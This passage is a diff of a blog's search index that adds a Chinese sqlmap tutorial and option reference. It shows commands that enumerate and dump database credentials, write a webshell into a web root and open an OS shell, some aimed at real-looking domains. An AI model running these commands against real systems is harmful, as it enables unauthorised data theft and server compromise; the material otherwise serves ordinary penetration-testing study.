-<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171429538.png" alt="image-20230805171429538"></p>
-<p>base64解码得CTF{happiness_needs_no_filters}</p>
-]]></content>
-      <tags>
-        <tag>ctf解题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow</title>
     <url>/2023/08/17/ctfshow/</url>
     <content><![CDATA[<p>ctfshow</p>
@@ -4439,6 +4069,199 @@ tap
       </tags>
   </entry>
   <entry>
+    <title>Sqlmap</title>
+    <url>/2023/09/03/Sqlmap/</url>
+    <content><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h3><p>sqlmap支持五种不同的注入模式：</p>
+<ul>
+<li>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
+<li>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
+<li>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
+<li>4、联合查询注入，可以使用union的情况下的注入。</li>
+<li>5、堆查询注入，可以同时执行多条语句的执行时的注入。</li>
+</ul>
+<h3 id="sqlmap支持的数据库有"><a href="#sqlmap支持的数据库有" class="headerlink" title="sqlmap支持的数据库有"></a>sqlmap支持的数据库有</h3><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
+<h2 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”</span><br></pre></td></tr></table></figure>
+
+<p>默认使用level1检测全部数据库类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3</span><br></pre></td></tr></table></figure>
+
+<p>指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）</p>
+<h3 id="跟随302跳转"><a href="#跟随302跳转" class="headerlink" title="跟随302跳转"></a>跟随302跳转</h3><p>当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br> 当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br> 目的就是：要追踪到错误信息。</p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>当程序有防get注入的时候，可以使用cookie注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2（只有level达到2才会检测cookie）</span><br></pre></td></tr></table></figure>
+
+<h3 id="从post数据包中注入"><a href="#从post数据包中注入" class="headerlink" title="从post数据包中注入"></a>从post数据包中注入</h3><p>可以使用burpsuite或者temperdata等工具来抓取post包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql   指定username参数</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入成功后"><a href="#注入成功后" class="headerlink" title="注入成功后"></a>注入成功后</h2><h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs</span><br></pre></td></tr></table></figure>
+
+<p>查询有哪些数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables</span><br></pre></td></tr></table></figure>
+
+<p>查询test数据库中有哪些表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns</span><br></pre></td></tr></table></figure>
+
+<p>查询test数据库中admin表有哪些字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin -C “username,password” –dump</span><br></pre></td></tr></table></figure>
+
+<p>dump出字段username与password中的数据</p>
+<p>其他命令参考下面</p>
+<h3 id="从数据库中搜索字段"><a href="#从数据库中搜索字段" class="headerlink" title="从数据库中搜索字段"></a>从数据库中搜索字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password</span><br></pre></td></tr></table></figure>
+
+<p> 在dedecms数据库中搜索字段admin或者password。</p>
+<h3 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h3><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p>
+<p>–file-read&#x3D;RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br> –file-write&#x3D;WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br> –file-dest&#x3D;DFILE 后端的数据库管理系统写入文件的绝对路径<br> 示例：<br> sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest  “e:\php\htdocs\dvwa\inc\include\1.php” –file-write  “f:\webshell\1112.php”</p>
+<p>使用shell命令：</p>
+<p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br> 接下来指定网站可写目录：<br> “E:\php\htdocs\dvwa”</p>
+<p><strong>注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）</strong></p>
+<h2 id="sqlmap详细命令："><a href="#sqlmap详细命令：" class="headerlink" title="sqlmap详细命令："></a>sqlmap详细命令：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–is-dba 当前用户权限（是否为root权限）</span><br><span class="line">–dbs 所有数据库</span><br><span class="line">–current-db 网站当前数据库</span><br><span class="line">–users 所有数据库用户</span><br><span class="line">–current-user 当前数据库用户</span><br><span class="line">–random-agent 构造随机user-agent</span><br><span class="line">–passwords 数据库密码</span><br><span class="line">–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理</span><br><span class="line">–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</span><br></pre></td></tr></table></figure>
+
+<h3 id="Options（选项）："><a href="#Options（选项）：" class="headerlink" title="Options（选项）："></a>Options（选项）：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help 显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh</span><br><span class="line"></span><br><span class="line">显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version 显示程序版本号</span><br><span class="line"></span><br><span class="line">-v VERBOSE 赘言级别：0-6(默认 1)</span><br><span class="line"></span><br><span class="line">目标：</span><br><span class="line"></span><br><span class="line">-d DIRECT 直接连接到数据库</span><br><span class="line"></span><br><span class="line">-u URL, --url=URL 目标 URL(e.g. &quot;www.target.com/vuln.php?id=1&quot;)</span><br><span class="line"></span><br><span class="line">-l LOGFILE 从 Burp 或 WebScarab 日志中解析目标</span><br><span class="line"></span><br><span class="line">-m BULKFILE</span><br><span class="line"></span><br><span class="line">在给定的文本文件中读取多个扫描目标</span><br><span class="line"></span><br><span class="line">-g GOOGLEDORK 将 Google dork 结果作为目标 URL</span><br><span class="line"></span><br><span class="line">-r REQUESTFILE 从文件中读取 HTTP 请求</span><br><span class="line"></span><br><span class="line">-c CONFIGFILE 从 INI 配置文件中读取配置选项</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>保存进度继续跑：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br><span class="line">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span><br></pre></td></tr></table></figure>
+
+<h3 id="Target（目标）："><a href="#Target（目标）：" class="headerlink" title="Target（目标）："></a>Target（目标）：</h3><p>以下至少需要设置其中一个选项，设置目标URL。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d DIRECT 直接连接到数据库。</span><br><span class="line">-u URL, –url=URL 目标URL。</span><br><span class="line">-l LIST 从Burp或WebScarab代理的日志中解析目标。</span><br><span class="line">-r REQUESTFILE 从一个文件中载入HTTP请求。</span><br><span class="line">-g GOOGLEDORK 处理Google dork的结果作为目标URL。</span><br><span class="line">-c CONFIGFILE 从INI配置文件中加载选项。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Request（请求）："><a href="#Request（请求）：" class="headerlink" title="Request（请求）："></a>Request（请求）：</h3><p>这些选项可以用来指定如何连接到目标URL。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--data=DATA 通过 POST 方法提交的数据字符串--param-del=PDEL 用于分割参数值的字符</span><br><span class="line">--cookie=COOKIE HTTP Cookie 头</span><br><span class="line">--cookie-del=CDEL 用于分割 cookie 值的字符</span><br><span class="line">--load-cookies=L.. 包含 cookies 的 Netscape/wget 格式文件</span><br><span class="line">--drop-set-cookie 忽略响应中的 Set-Cookie 头</span><br><span class="line">--user-agent=AGENT</span><br><span class="line">HTTP User-Agent 头</span><br><span class="line">--random-agent 使用随机选择的 HTTP User-Agent 头</span><br><span class="line">--host=HOST HTTP Host 头</span><br><span class="line">--referer=REFERER HTTP Referer 头</span><br><span class="line">--headers=HEADERS Extra 头(e.g. &quot;Accept-Language: fr\nETag: 123&quot;)</span><br><span class="line">--auth-type=AUTH.. HTTP 认证方式(Basic, Digest, NTLM 或 PKI)</span><br><span class="line">--auth-cred=AUTH.. HTTP 认证证书(name:password)</span><br><span class="line">--auth-private=A.. HTTP 认证 PEM 私钥文件</span><br><span class="line">--proxy=PROXY 使用代理连接目标 URL</span><br><span class="line">--proxy-cred=PRO.. 代理认证证书(name:password)</span><br><span class="line">--proxy-file=PRO.. 从文件读取代理列表</span><br><span class="line">--ignore-proxy 接受系统默认代理设置</span><br><span class="line">--tor 使用 Tor 匿名网络</span><br><span class="line">--tor-port=TORPORT 设置默认以外的 Tor 代理端口</span><br><span class="line">--tor-type=TORTYPE 设置 Tor 代理方式(HTTP(默认), SOCKS4 或</span><br><span class="line">SOCKS5)</span><br><span class="line">--check-tor 检查 Tor 是否正确使用--delay=DELAY 每个 HTTP 请求之间延迟的秒数</span><br><span class="line">--timeout=TIMEOUT 认定连接超时的秒数(默认 30)</span><br><span class="line">--retries=RETRIES 超时重试的次数(默认 3)</span><br><span class="line">--randomize=RPARAM 随机改变给定参数的值</span><br><span class="line">--safe-url=SAFURL 设置一个安全链接供系统经常访问</span><br><span class="line">--safe-freq=SAFREQ 设置一个安全连接供系统在两次测试之间访问</span><br><span class="line">--skip-urlencode 不对攻击载荷数据进行 URL 编码</span><br><span class="line">--force-ssl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumeration（枚举）："><a href="#Enumeration（枚举）：" class="headerlink" title="Enumeration（枚举）："></a>Enumeration（枚举）：</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br> 您自己的SQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a, --all 检索一切</span><br><span class="line">-b, --banner 检索 DBMS banner 信息</span><br><span class="line">--current-user 检索 DBMS 当前用户</span><br><span class="line">--current-db 检索 DBMS 当前数据库</span><br><span class="line">--hostname检索 DBMS 服务器主机名</span><br><span class="line">--is-dba 检测当前用户是否是 DBA</span><br><span class="line">--users枚举 DBMS 用户名</span><br><span class="line">--passwords枚举 DBMS 用户密码哈希</span><br><span class="line">--privileges 枚举 DBMS 用户权限</span><br><span class="line">--roles枚举 DBMS 用户角色</span><br><span class="line">--dbs 枚举 DBMS 数据库</span><br><span class="line">--tables 枚举 DBMS 数据库表--columns 枚举 DBMS 数据库表字段</span><br><span class="line">--schema 枚举 DBMS 架构</span><br><span class="line">--count检索数据表中的条目数</span><br><span class="line">--dump 转储 DBMS 数据库表中的条目</span><br><span class="line">--dump-all 转储所有 DBMS 数据库表中的条目</span><br><span class="line">--search 搜索字段名, 表名和(或)库名</span><br><span class="line">--comments 检索 DBMS 注释</span><br><span class="line">-D DB DBMS 数据库</span><br><span class="line">-T TBL DBMS 数据库表</span><br><span class="line">-C COL DBMS 数据库表字段</span><br><span class="line">-X EXCLUDECOL 不枚举 DBMS 数据库表字段</span><br><span class="line">-U USER DBMS 用户</span><br><span class="line">--exclude-sysdbs 枚举数据库表时排除 DBMS 系统库</span><br><span class="line">--where=DUMPWHERE 转储数据表时使用 WHERE 条件</span><br><span class="line">--start=LIMITSTART 第一个查询的输出项检索</span><br><span class="line">--stop=LIMITSTOP 最后一个查询的输出项检索</span><br><span class="line">--first=FIRSTCHAR 第一个查询的输出字的字符检索</span><br><span class="line">--last=LASTCHAR 最后一个查询的输出字的字符检索</span><br><span class="line">--sql-query=QUERY 要执行的 SQL 语句</span><br><span class="line">--sql-shell返回交互式的 SQL shell</span><br><span class="line">--sql-file=SQLFILE 从给定的文件执行 SQL 语句强制暴破</span><br><span class="line">--common-tables 检查是否存在常见表</span><br><span class="line">--common-columns 检查是否存在常见字段</span><br></pre></td></tr></table></figure>
+
+<h3 id="Optimization（优化）："><a href="#Optimization（优化）：" class="headerlink" title="Optimization（优化）："></a>Optimization（优化）：</h3><p>这些选项可用于优化SqlMap的性能。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-o 开启所有优化开关</span><br><span class="line"></span><br><span class="line">–predict-output 预测常见的查询输出</span><br><span class="line"></span><br><span class="line">–keep-alive 使用持久的HTTP（S）连接</span><br><span class="line"></span><br><span class="line">–null-connection 从没有实际的HTTP响应体中检索页面长度</span><br><span class="line"></span><br><span class="line">–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</span><br></pre></td></tr></table></figure>
+
+<h3 id="Injection（注入）："><a href="#Injection（注入）：" class="headerlink" title="Injection（注入）："></a>Injection（注入）：</h3><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER 测试参数</span><br><span class="line">--skip=SKIP跳过对给定参数的测试</span><br><span class="line">--dbms=DBMS在这里强制指定后端 DBMS--dbms-cred=DBMS.. DBMS 认证证书(user:password)</span><br><span class="line">--os=OS在这里强制后端 DBMS 操作系统</span><br><span class="line">--invalid-bignum 使用大数字无效化值</span><br><span class="line">--invalid-logical 使用逻辑运算无效化值</span><br><span class="line">--invalid-string 使用随机字符串无效化值</span><br><span class="line">--no-cast 关闭攻击载荷铸造机制</span><br><span class="line">--no-escape 关闭字符串逃逸机制</span><br><span class="line">--prefix=PREFIX 注入攻击载荷前缀字符串</span><br><span class="line">--suffix=SUFFIX 注入攻击载荷后缀字符串</span><br><span class="line">--tamper=TAMPER使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure>
+
+<h3 id="Detection（检测）："><a href="#Detection（检测）：" class="headerlink" title="Detection（检测）："></a>Detection（检测）：</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--level=LEVEL 执行测试的等级(1-5, 默认 1)</span><br><span class="line">--risk=RISK 执行测试的风险(0-3, 默认 1)</span><br><span class="line">--string=STRING 查询被评估为 True 时的匹配字符串</span><br><span class="line">--not-string=NOT.. 查询被评估为 False 时的匹配字符串</span><br><span class="line">--regexp=REGEXP 查询被评估为 True 时的正则表达式</span><br><span class="line">--code=CODE 查询被评估为 True 时的 HTTP 代码</span><br><span class="line">--text-only 仅基于文本内容比较网页</span><br><span class="line">--titles 仅基于标题比较网页</span><br></pre></td></tr></table></figure>
+
+<h3 id="Techniques（技巧）："><a href="#Techniques（技巧）：" class="headerlink" title="Techniques（技巧）："></a>Techniques（技巧）：</h3><p>这些选项可用于调整具体的SQL注入测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--technique=TECH 使用的 SQL 注入技术(默认使用所有技术)--time-sec=TIMESEC DBMS 响应的延迟秒数(默认 5)</span><br><span class="line">--union-cols=UCOLS UNION 查询注入测试字段的范围</span><br><span class="line">--union-char=UCHAR 暴破字段数量使用的字符</span><br><span class="line">--union-from=UFROM UNION 查询注入 FROM 部分使用的数据表</span><br><span class="line">--dns-domain=DNS.. DNS 溢出攻击所使用的域名</span><br><span class="line">--second-order=S.. 二阶响应页面 URL</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fingerprint（指纹）："><a href="#Fingerprint（指纹）：" class="headerlink" title="Fingerprint（指纹）："></a>Fingerprint（指纹）：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f, --fingerprint 执行检查广泛的DBMS版本指纹</span><br></pre></td></tr></table></figure>
+
+<h3 id="用户定义函数注入："><a href="#用户定义函数注入：" class="headerlink" title="用户定义函数注入："></a>用户定义函数注入：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--udf-inject 注入用户自定义函数</span><br><span class="line"></span><br><span class="line">--shared-lib=SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>
+
+<h3 id="Brute-force（蛮力）："><a href="#Brute-force（蛮力）：" class="headerlink" title="Brute force（蛮力）："></a>Brute force（蛮力）：</h3><p>这些选项可以被用来运行蛮力检查。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–common-tables 检查存在共同表</span><br><span class="line"></span><br><span class="line">–common-columns 检查存在共同列</span><br></pre></td></tr></table></figure>
+
+<p>User-defined function injection（用户自定义函数注入）：<br> 这些选项可以用来创建用户自定义函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–udf-inject 注入用户自定义函数</span><br><span class="line"> –shared-lib=SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>
+
+<h3 id="强制使用-SSL-HTTPS"><a href="#强制使用-SSL-HTTPS" class="headerlink" title="强制使用 SSL&#x2F;HTTPS"></a>强制使用 SSL&#x2F;HTTPS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--hpp 使用 HTTP 参数污染</span><br><span class="line"></span><br><span class="line">--eval=EVALCODE 供提交请求之前评估参数的 Python 代码(e.g.</span><br><span class="line"></span><br><span class="line">&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="File-system-access（访问文件系统）："><a href="#File-system-access（访问文件系统）：" class="headerlink" title="File system access（访问文件系统）："></a>File system access（访问文件系统）：</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line"></span><br><span class="line">–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line"></span><br><span class="line">–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>
+
+<h3 id="Operating-system-access（操作系统访问）："><a href="#Operating-system-access（操作系统访问）：" class="headerlink" title="Operating system access（操作系统访问）："></a>Operating system access（操作系统访问）：</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–os-cmd=OSCMD 执行操作系统命令</span><br><span class="line"></span><br><span class="line">–os-shell 交互式的操作系统的shell</span><br><span class="line"></span><br><span class="line">–os-pwn 获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</span><br><span class="line"></span><br><span class="line">–os-bof 存储过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">–priv-esc 数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">–msf-path=MSFPATH Metasploit Framework本地的安装路径</span><br><span class="line"></span><br><span class="line">–tmp-path=TMPPATH 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h3><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">–reg-read 读一个Windows注册表项值</span><br><span class="line"></span><br><span class="line">–reg-add 写一个Windows注册表项值数据</span><br><span class="line"></span><br><span class="line">–reg-del 删除Windows注册表键值</span><br><span class="line"></span><br><span class="line">–reg-key=REGKEY Windows注册表键</span><br><span class="line"></span><br><span class="line">–reg-value=REGVAL Windows注册表项值</span><br><span class="line"></span><br><span class="line">–reg-data=REGDATA Windows注册表键值数据</span><br><span class="line"></span><br><span class="line">–reg-type=REGTYPE Windows注册表项值类型</span><br></pre></td></tr></table></figure>
+
+<p>这些选项可以用来设置一些一般的工作参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s SESSIONFILE 从存储(.sqlite)文件中读取会话</span><br><span class="line">-t TRAFFICFILE 记录所有 HTTP 流量为一个文本文件</span><br><span class="line">--batch</span><br><span class="line">从不询问用户输入, 使用默认行为</span><br><span class="line">--charset=CHARSET 强制数据检索使用的字符编码</span><br><span class="line">--crawl=CRAWLDEPTH 从目标 URL 抓取起始网页</span><br><span class="line">--csv-del=CSVDEL CSV 输出中使用的定界符(默认&quot;,&quot;)</span><br><span class="line">--dump-format=DU.. 转储数据的格式(CSV(默认), 可以设置为 HTML</span><br><span class="line">或 SQLITE)</span><br><span class="line">--eta 显示每个输出的预计到达时间</span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line">--forms</span><br><span class="line">分析并测试目标 URL 中的表单</span><br><span class="line">--fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line">--hex 对数据检索使用 DBMS 的 hex 函数</span><br><span class="line">--output-dir=OUT.. 自定义输出目录路径--parse-errors 从响应中分析并显示 DBMS 错误消息</span><br><span class="line">--pivot-column=P.. 透视字段</span><br><span class="line">--save 保存选项到 INI 配置文件</span><br><span class="line">--scope=SCOPE 用正则表达式从所提供的代理日志过滤目标</span><br><span class="line">--test-filter=TE.. 通过攻击载荷和(或)标题选择测试(e.g. ROW)</span><br><span class="line">--update 更新 sqlmap</span><br></pre></td></tr></table></figure>
+
+<h3 id="Miscellaneous（杂项）："><a href="#Miscellaneous（杂项）：" class="headerlink" title="Miscellaneous（杂项）："></a>Miscellaneous（杂项）：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z MNEMONICS 使用短记忆法(e.g. &quot;flu,bat,ban,tec=EU&quot;)</span><br><span class="line">--alert=ALERT 当找到 SQL 注入时运行操作系统命令</span><br><span class="line">--answers=ANSWERS 设置问题的答案(e.g. &quot;quit=N,follow=N&quot;)</span><br><span class="line">--beep 当找到 SQL 注入时发出蜂鸣</span><br><span class="line">--check-waf 启发式检查 WAF/IPS/IDS 保护</span><br><span class="line">--cleanup 从 sqlmap 具体 UDF 和表清理 DBMS</span><br><span class="line">--dependencies 检查是否缺少(非核心)的 sqlmap 的依赖</span><br><span class="line">--disable-coloring 禁用控制台输出着色</span><br><span class="line">--gpage=GOOGLEPAGE 从指定页码使用 Google dork 结果</span><br><span class="line">--identify-waf 使测试通过 WAF/IPS/IDS 保护</span><br><span class="line">--mobile 通过 HTTP User-Agent 头模拟智能手机</span><br><span class="line">--page-rank 为 Google dork 结果显示网页排名(PR)</span><br><span class="line">–forms 对目标URL的解析和测试形式</span><br><span class="line">–parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line">–replicate 复制转储的数据到一个sqlite3数据库</span><br><span class="line">–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</span><br><span class="line">--purge-output 从输出目录中安全删除所有内容</span><br><span class="line">--smart 仅通过积极的启发式进行测试</span><br><span class="line">--wizard 用于初级用户的简单向导接口</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP基础信息"><a href="#SQLMAP基础信息" class="headerlink" title="SQLMAP基础信息"></a>SQLMAP基础信息</h3><p> <strong>获取当前用户名称</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --current-user</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取当前数据库名称</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security --tables</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取字段</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取字段内容</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -D security -T users -C id --dump</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP进阶信息内容"><a href="#SQLMAP进阶信息内容" class="headerlink" title="SQLMAP进阶信息内容"></a>SQLMAP进阶信息内容</h3><p><strong>执行测试等级</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --level 2</span><br></pre></td></tr></table></figure>
+
+<p><strong>指定数据库类型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --dbms &quot;Mysql&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>列数据库用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --users</span><br></pre></td></tr></table></figure>
+
+<p><strong>列数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据库用户密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --passwords</span><br></pre></td></tr></table></figure>
+
+<p><strong>列出指定用户数据库密码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --passwords -U root</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --privileges</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看指定用户权限</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --privileges -U root</span><br></pre></td></tr></table></figure>
+
+<p><strong>是否是数据库管理员</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --is-dba</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举数据库用户角色</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; --roles</span><br></pre></td></tr></table></figure>
+
+<p><strong>导入用户自定义函数（获取系统权限！）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --udf-inject</span><br></pre></td></tr></table></figure>
+
+<p><strong>cookie注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --cookie &quot;COOKIE_VALUE&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取banner信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -b</span><br></pre></td></tr></table></figure>
+
+<p><strong>post注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot; --data &quot;id=3&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>指纹判别数据库类型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&quot; -f</span><br></pre></td></tr></table></figure>
+
+<p><strong>代理注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;  --proxy&quot;http://127.0.0.1:8118&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>指定关键词</strong></p>
